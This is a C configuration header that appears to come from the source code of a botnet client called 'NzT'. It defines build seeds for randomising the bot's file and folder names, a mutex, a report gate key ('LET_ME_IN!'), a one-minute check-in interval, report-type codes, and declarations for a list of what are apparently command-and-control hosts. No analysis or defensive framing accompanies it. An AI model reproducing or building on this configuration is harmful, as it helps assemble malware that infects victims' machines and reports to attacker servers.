#ifndef _CONFIG_H_
#define _CONFIG_H_

#define NZT_SEED				0x1231231		//change every unique build
#define NZT_VERSION				0x1000
#define NZT_MUTEX				"m_NzT_m"			

#define BOT_FILE_NAME_SEED		0x1231231
#define BOT_FOLDER_NAME_SEED	0x41231

#define REPORT_GATE_KEY			"LET_ME_IN!"
#define REPORT_TIME				1				//minutes

#define REPORT_TYPE_KNOCK		0x24023dd8
#define REPORT_TYPE_CONFIG		0xd48a2f7c

extern	UCHAR					g_NumberHosts;
extern	LPTSTR*					g_pHosts;
extern	LPTSTR					g_pHostsString;
extern	LPTSTR					g_Hosts[];

#endif